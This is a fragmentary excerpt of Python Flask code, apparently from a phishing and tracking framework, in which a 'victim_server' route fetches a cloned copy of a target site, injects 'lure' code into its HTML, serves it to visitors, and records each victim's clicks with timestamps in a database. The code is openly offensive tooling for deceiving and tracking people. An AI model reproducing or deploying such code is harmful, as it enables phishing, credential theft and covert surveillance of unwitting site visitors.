...
class victim_server(object):
    @app.route("/" + trasup.victim_path)
    def homeVictim():
        opener = urllib2.build_opener()
        headers = victim_headers(request.user_agent)
        opener.addheaders = headers
        html = victim_inject_code(opener.open(trasup.url_to_clone).read(), 'lure')
        return html
    ...
    def register():
        ...
        db.sentences_victim('insert_click', [vId, trasup.url_to_clone, time.strftime("%Y-%m-%d - %H:%M:%S")], 2)
